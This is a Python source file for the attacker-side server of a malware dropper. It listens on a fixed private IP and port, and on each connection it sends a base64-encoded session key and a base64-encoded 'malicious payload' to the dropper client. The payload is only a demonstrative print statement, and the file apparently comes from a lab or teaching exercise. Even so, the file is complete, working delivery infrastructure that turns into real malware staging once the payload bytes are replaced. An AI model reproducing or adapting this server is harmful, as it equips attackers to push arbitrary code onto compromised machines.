#!/usr/bin/env python3

""" Implementation of the server that sends some malicious code to its
    dropper client.
"""

import base64
import logging
import socket
import os
import secrets

class Server:
    """ This class represents a server that stores some malicious payload and sends
    it to the dropper once the connection is established.
    """

    def __init__(self, port):
        self._port = port
        # Initialize the socket for connection using TCP protocol.
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def malicious_code(self):
        """ Malicious payload. In this case just a demonstrative command. """
        return b'print("Hello there hahahaha")'

    @property
    def port(self):
        """ Port, on which the server runs (`int`). """
        return self._port

    @port.setter
    def port(self, new_port):
        """ Sets the port the server listens to into {new_port}"""
        self._port = new_port

    @property
    def socket(self):
        """ Server socket. """
        return self._socket

    def initialize(self):
        """ Initialize server before the session. """
        try:
            # Binds the server to the port and listens to the port.
            self.socket.bind(('10.0.2.6', self._port))
            self.socket.listen()
            logging.debug('Server was successfully initialized.')
        except socket.error:
            print('Server was not initialized due to an error.')
    
    def encode_integer(self, num):
        num_bytes = num.to_bytes((num.bit_length() + 7) // 8, 'big')
        print(num_bytes)
        encoded_bytes = base64.b64encode(num_bytes)
        return encoded_bytes


    def send_malicious_code(self):
        """ Send malware to the client once the connection is established. """
        # Establish a connection with the client.
        while True:
            connection, address = self.socket.accept()
            with connection:
                print('Connection with dropper established from {}'.format(address))
                session_key = self.encode_integer(address[1])
                print(session_key, address[1])
                encoded_payload = base64.b64encode(self.malicious_code)
                connection.send(session_key)
                connection.send(encoded_payload)


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create and initialize a server running on attacker's side.
    # It takes the port number 27000 (permanent) and will listen to this port.
    server = Server(27000)
    server.initialize()
    # Send a payload to the dropper client once it establishes a connection.
    server.send_malicious_code()
